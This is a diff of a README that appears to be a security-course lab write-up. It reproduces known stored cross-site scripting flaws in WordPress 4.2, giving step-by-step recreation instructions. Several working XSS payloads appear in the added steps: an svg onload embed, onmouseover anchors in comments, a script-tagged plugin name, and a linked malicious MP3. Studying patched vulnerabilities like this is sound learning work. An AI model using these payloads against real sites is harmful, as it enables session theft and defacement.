@@ -16,7 +16,8 @@ Time spent: **10** hours spent in total
            
            1. Create a new post 
            
-           2. Edit a post to contain the following string:  [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
+           2. Edit a post to contain the following string:
+           [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
         
            3. Publish the post.
            
@@ -32,7 +33,14 @@ Time spent: **10** hours spent in total
     - Fixed in version: 4.2.4
   - [ ] GIF Walkthrough: <img src="LegacyThemePreviewCrossSite.gif">
   - [ ] Steps to recreate: 
-         <a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>
+             
+           1. Go to the comment section 
+           
+           2. Type the following string:
+           <a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>]
+        
+           3. Publish the comment.
+           
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/changeset/33549)
   - [ ] Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
@@ -45,6 +53,18 @@ Time spent: **10** hours spent in total
     - Fixed in version: 4.2.13
   - [ ] GIF Walkthrough:  <img src="AuthenticatedCrossSiteScripti.gif">
   - [ ] Steps to recreate: 
+  
+  
+           1. Create a new post 
+           
+           2. Download the XSS.mp3 file: https://www.securify.nl/advisory/SFY20160742/xss.mp3
+           
+           3. Upload MP3 file to the media library
+           
+           4. insert an Audio Playlist in this post containing this MP3. 
+           
+           5. Publish this post. 
+
   - [ ] Affected source code:
     - [Link 1](https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7)
   - [ ] Reference: http://seclists.org/oss-sec/2017/q1/563
@@ -57,6 +77,17 @@ Time spent: **10** hours spent in total
     - Fixed in version:  4.2.11
   - [ ] GIF Walkthrough: <img src="XSSinupdate-core.gif">
   - [ ] Steps to recreate: 
+  
+  
+         
+           1. go to plugin and edit any plugins. 
+           
+           2. change Plugin name to : <script> alert('1');</script>
+           
+           3. Navigate to update-core.php.
+
+
+
   - [ ] Affected source code:
     - [Link 1](https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php)
 5. (Optional) WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
@@ -66,7 +97,17 @@ Time spent: **10** hours spent in total
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough:  <img src="UnauthenticatedStoredCrossSit.gif">
   - [ ] Steps to recreate: 
-      <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+            
+           1. Go to the comment section 
+           
+           2. Type the following string:
+          <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>  
+          
+           Must be greater than 64 kb. 
+        
+           3. Publish the comment.
+
+      
   - [ ] Affected source code: Not specified source code. 
   - [ ] Reference:https://klikki.fi/adv/wordpress2.html
 
